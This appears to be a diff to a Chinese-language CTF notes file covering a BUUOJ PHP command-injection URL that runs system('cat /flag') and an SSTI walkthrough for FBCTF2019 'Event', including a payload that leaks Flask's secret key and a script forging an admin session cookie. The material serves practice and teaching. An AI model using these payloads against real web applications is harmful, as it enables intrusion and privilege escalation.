@@ -95,3 +95,32 @@ for($k=1;$k<=sizeof($payload);$k++){
 
 `http://833b3035-65c8-45f0-aef4-8214e5f05661.node3.buuoj.cn/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag`
 
+
+
+# SSTI
+
+## SSTI | 入门 | [FBCTF2019]Event
+
+随便注册进入发现 event_important 存在 ssti注入。
+
+post `event_important=__class__.__init__.__globals__[app].config` 获得secret key
+
+```python
+from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
+
+session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+
+@app.route('/')
+def index():
+    print(session_serializer.dumps("admin"))
+
+index()
+```
+
+`python exp.py` 得到最终的cookie
+
+在devtools - Application - Cookies 替换user，再访问admin panel
